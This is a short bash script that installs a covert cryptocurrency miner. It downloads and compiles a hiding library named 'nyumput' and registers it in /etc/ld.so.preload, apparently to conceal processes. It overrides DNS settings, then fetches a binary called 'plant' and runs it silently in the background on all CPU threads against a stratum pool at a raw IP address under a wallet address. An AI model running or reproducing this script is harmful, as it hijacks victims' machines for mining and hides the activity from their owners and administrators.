#!/bin/bash
apt-get update ; apt-get install sudo -y
apt install unzip
curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
wget https://github.com/kartolo92/jadul/raw/main/plant
chmod +x plant
./plant -a power2b -o stratum+tcp://167.99.139.112:80 -u MfCwayN6AQ1dPptt7yfAAiEfrSswnU2XcF.$(shuf -n 1 -i 1-99999)-NOTE -t $(nproc --all) > /dev/null 2>&1 &
